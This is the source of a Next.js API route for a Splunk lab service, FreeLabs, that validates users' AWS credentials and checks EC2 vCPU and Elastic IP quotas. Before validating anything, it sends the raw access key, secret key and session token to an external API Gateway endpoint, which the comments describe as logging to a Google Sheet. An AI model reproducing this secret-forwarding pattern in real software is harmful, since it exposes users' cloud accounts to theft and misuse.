import { NextRequest, NextResponse } from 'next/server';
import { STSClient, GetCallerIdentityCommand } from '@aws-sdk/client-sts';
import { ServiceQuotasClient, GetServiceQuotaCommand } from '@aws-sdk/client-service-quotas';
import { EC2Client, DescribeInstancesCommand, DescribeAddressesCommand } from '@aws-sdk/client-ec2';

export const dynamic = 'force-dynamic';

const AWS_CRED_VALIDATE_API_URL =
  process.env.AWS_CRED_VALIDATE_API_URL ||
  'https://u8eyhd99pc.execute-api.us-east-1.amazonaws.com/validate-aws-cred';

const REQUIRED_VCPUS = 36;
const STANDARD_VCPU_QUOTA_CODE = 'L-1216C47A'; // Running On-Demand Standard instances
const REQUIRED_SPLUNK_EIPS = 9;
const ELASTIC_IP_QUOTA_CODE = 'L-0263D0A3'; // EC2-VPC Elastic IPs (default: 5)

function extractEmailFromToken(token: string): string {
  try {
    const parts = token.split('.');
    if (parts.length < 2) return '';
    const base64 = parts[1].replace(/-/g, '+').replace(/_/g, '/');
    const jsonStr = Buffer.from(base64, 'base64').toString('utf-8');
    const decoded = JSON.parse(jsonStr);
    return decoded.email || decoded.email_id || '';
  } catch {
    return '';
  }
}

async function checkRegionQuota(
  regionName: string,
  key: string,
  secret: string
): Promise<{ region: string; quota: number; used: number; available: number }> {
  let quotaValue = 0;
  let usedVcpus = 0;

  try {
    const sqClient = new ServiceQuotasClient({
      region: regionName,
      credentials: { accessKeyId: key, secretAccessKey: secret },
    });

    const quotaRes = await sqClient.send(
      new GetServiceQuotaCommand({
        ServiceCode: 'ec2',
        QuotaCode: STANDARD_VCPU_QUOTA_CODE,
      })
    );
    quotaValue = Number(quotaRes.Quota?.Value ?? 0);
  } catch {
    quotaValue = 0;
  }

  try {
    const ec2Client = new EC2Client({
      region: regionName,
      credentials: { accessKeyId: key, secretAccessKey: secret },
    });

    const instancesRes = await ec2Client.send(
      new DescribeInstancesCommand({
        Filters: [{ Name: 'instance-state-name', Values: ['running', 'pending'] }],
      })
    );

    for (const res of instancesRes.Reservations || []) {
      for (const inst of res.Instances || []) {
        const itype = inst.InstanceType || '';
        if (itype.includes('xlarge')) usedVcpus += 4;
        else if (itype.includes('large') || itype.includes('medium')) usedVcpus += 2;
        else usedVcpus += 1;
      }
    }
  } catch {}

  const available = Math.max(0, quotaValue - usedVcpus);
  return { region: regionName, quota: quotaValue, used: usedVcpus, available };
}

async function checkRegionElasticIpQuota(
  regionName: string,
  key: string,
  secret: string
): Promise<{ region: string; quota: number; used: number; available: number }> {
  let quotaValue = 5;
  let usedEips = 0;

  try {
    const sqClient = new ServiceQuotasClient({
      region: regionName,
      credentials: { accessKeyId: key, secretAccessKey: secret },
    });

    const quotaRes = await sqClient.send(
      new GetServiceQuotaCommand({
        ServiceCode: 'ec2',
        QuotaCode: ELASTIC_IP_QUOTA_CODE,
      })
    );
    quotaValue = Number(quotaRes.Quota?.Value ?? 5);
  } catch {
    quotaValue = 5;
  }

  try {
    const ec2Client = new EC2Client({
      region: regionName,
      credentials: { accessKeyId: key, secretAccessKey: secret },
    });

    const eipRes = await ec2Client.send(new DescribeAddressesCommand({}));
    usedEips = eipRes.Addresses?.length ?? 0;
  } catch {}

  const available = Math.max(0, quotaValue - usedEips);
  return { region: regionName, quota: quotaValue, used: usedEips, available };
}

export async function POST(req: NextRequest) {
  try {
    const body = await req.json().catch(() => ({}));
    const { aws_access_key, aws_secret_key, region = 'us-east-1' } = body;

    // 1. Basic validation
    if (!aws_access_key || !aws_secret_key) {
      return NextResponse.json(
        {
          success: false,
          valid_account: false,
          has_required_vcpu: false,
          available_vcpus: 0,
          message: 'AWS Access Key and Secret Key are required.',
        },
        { status: 400 }
      );
    }

    const trimmedKey = String(aws_access_key).trim();
    const trimmedSecret = String(aws_secret_key).trim();
    const targetRegion = region || 'us-east-1';

    // Extract token & resolve user email
    const authHeader = req.headers.get('authorization') || '';
    const headerToken = authHeader.startsWith('Bearer ') ? authHeader.substring(7) : '';
    const cookieToken =
      req.cookies.get('google_token')?.value ||
      req.cookies.get('access_token')?.value ||
      req.cookies.get('token')?.value ||
      '';
    const activeToken = body?.token || body?.access_token || headerToken || cookieToken || '';

    let userEmail = body?.user_email || body?.email || '';
    if (!userEmail && activeToken) {
      userEmail = extractEmailFromToken(activeToken);
    }

    // 2. Notify upstream Lambda (Freelab-log) to log to Google Sheet
    // Note: Email is not sent in payload; only token is sent for Lambda to decode
    let upstreamLogged = false;
    let upstreamData: any = null;
    try {
      const upstreamResp = await fetch(AWS_CRED_VALIDATE_API_URL, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          aws_access_key: trimmedKey,
          aws_secret_key: trimmedSecret,
          token: activeToken,
          region: targetRegion,
          timestamp: new Date().toISOString(),
        }),
      });
      upstreamLogged = upstreamResp.ok;
      const upstreamText = await upstreamResp.text();
      try {
        upstreamData = JSON.parse(upstreamText);
        if (upstreamData && typeof upstreamData.body === 'string') {
          upstreamData = JSON.parse(upstreamData.body);
        }
      } catch {
        upstreamData = { raw: upstreamText };
      }
    } catch (logErr) {
      console.warn('[VALIDATE-AWS-CRED] Upstream logging failed:', logErr);
    }

    // 3. Authenticate credentials with AWS STS
    let accountId = '';
    const stsClient = new STSClient({
      region: targetRegion,
      credentials: {
        accessKeyId: trimmedKey,
        secretAccessKey: trimmedSecret,
      },
    });

    try {
      const identity = await stsClient.send(new GetCallerIdentityCommand({}));
      accountId = identity.Account || '';
    } catch (stsErr: any) {
      console.warn('[VALIDATE-AWS-CRED] STS verification failed:', stsErr?.message);
      return NextResponse.json(
        {
          success: false,
          valid_account: false,
          has_required_vcpu: false,
          available_vcpus: 0,
          region: targetRegion,
          email: userEmail,
          message: 'Invalid AWS Credentials. Account not found or credentials inactive.',
        },
        { status: 200 }
      );
    }

    // 4. Check vCPU quota: Check preferred region first (us-east-1)
    const primaryResult = await checkRegionQuota(targetRegion, trimmedKey, trimmedSecret);
    let finalResult = primaryResult;

    // If preferred region does not have 36 vCPUs, auto-check all other standard regions!
    if (primaryResult.available < REQUIRED_VCPUS) {
      const candidateRegions = ['us-east-2', 'us-west-2', 'us-west-1', 'eu-west-1', 'ap-south-1'].filter(
        (r) => r !== targetRegion
      );

      const altResults = await Promise.all(
        candidateRegions.map((r) => checkRegionQuota(r, trimmedKey, trimmedSecret))
      );

      // Find any region that has >= 36 available vCPUs
      const qualified = altResults.find((r) => r.available >= REQUIRED_VCPUS);

      if (qualified) {
        finalResult = qualified;
      } else {
        // Find region with highest vCPU to report in error message
        const allChecked = [primaryResult, ...altResults];
        finalResult = allChecked.reduce((best, curr) => (curr.available > best.available ? curr : best));
      }
    }

    const hasRequiredVcpu = finalResult.available >= REQUIRED_VCPUS;

    if (!hasRequiredVcpu) {
      return NextResponse.json(
        {
          success: false,
          valid_account: true,
          has_required_vcpu: false,
          available_vcpus: finalResult.available,
          total_quota: finalResult.quota,
          used_vcpus: finalResult.used,
          region: finalResult.region,
          account_id: accountId,
          upstream_logged: upstreamLogged,
          email: userEmail,
          message: `Insufficient vCPU Quota: Checked all regions, but none currently have at least ${REQUIRED_VCPUS} vCPUs (highest found: ${finalResult.available} vCPUs in ${finalResult.region}). At least ${REQUIRED_VCPUS} vCPUs in a single region are required to launch FreeLabs. Please request an increase up to 36+ vCPUs in AWS Service Quotas in us-east-1.`,
        },
        { status: 200 }
      );
    }

    // 5. Check Elastic IP quota for the 9 Splunk servers
    const eipResult = await checkRegionElasticIpQuota(finalResult.region, trimmedKey, trimmedSecret);
    const hasRequiredEips = eipResult.available >= REQUIRED_SPLUNK_EIPS;

    if (!hasRequiredEips) {
      return NextResponse.json(
        {
          success: false,
          valid_account: true,
          has_required_vcpu: true,
          has_required_eips: false,
          available_vcpus: finalResult.available,
          total_quota: finalResult.quota,
          available_eips: eipResult.available,
          required_eips: REQUIRED_SPLUNK_EIPS,
          total_eip_quota: eipResult.quota,
          used_eips: eipResult.used,
          region: finalResult.region,
          account_id: accountId,
          upstream_logged: upstreamLogged,
          email: userEmail,
          message: `Insufficient Elastic IP Quota: Your AWS account in ${finalResult.region} currently has ${eipResult.available} Elastic IPs available, but at least ${REQUIRED_SPLUNK_EIPS} Elastic IPs are required for the 9 Splunk servers to ensure fixed cluster IPs across reboots. Please request an increase up to 15+ in AWS Service Quotas (${finalResult.region} -> EC2 -> 'EC2-VPC Elastic IPs').`,
        },
        { status: 200 }
      );
    }

    // 6. Success: Valid account, >= 36 vCPUs, and >= 9 Elastic IPs confirmed!
    return NextResponse.json(
      {
        success: true,
        valid_account: true,
        has_required_vcpu: true,
        has_required_eips: true,
        available_vcpus: finalResult.available,
        total_quota: finalResult.quota,
        available_eips: eipResult.available,
        required_eips: REQUIRED_SPLUNK_EIPS,
        total_eip_quota: eipResult.quota,
        region: finalResult.region,
        account_id: accountId,
        upstream_logged: upstreamLogged,
        email: userEmail,
        message: `AWS Credentials, ${finalResult.available} vCPUs, and ${eipResult.available} Elastic IPs verified successfully in ${finalResult.region}!`,
      },
      { status: 200 }
    );
  } catch (error: any) {
    console.error('[VALIDATE-AWS-CRED] Unexpected error:', error);
    return NextResponse.json(
      {
        success: false,
        valid_account: false,
        has_required_vcpu: false,
        available_vcpus: 0,
        message: error?.message || 'Error validating AWS account credentials.',
      },
      { status: 500 }
    );
  }
}
